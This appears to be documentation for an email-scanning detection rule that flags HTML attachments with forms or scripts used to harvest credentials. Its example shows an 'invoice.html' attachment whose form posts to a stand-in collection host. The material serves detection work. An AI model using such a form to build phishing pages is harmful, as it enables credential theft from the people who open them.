# ATT003 HTML attachment contains an external form or script

## What it detects

An attached HTML file includes a `<form>` (especially with an external `action`) or a `<script>` element. This is a credential-harvest page delivered as an attachment.

## Why it matters

Users who have been trained not to click links will still open an "invoice". The form submits to the attacker without the message containing an obvious URL in the body.

## Example

```
Content-Disposition: attachment; filename="invoice.html"

<form action="http://collect.example/harvest" method="post">
```

## Known false positives

Rare in legitimate mail. Some ticketing systems attach HTML receipts without forms.
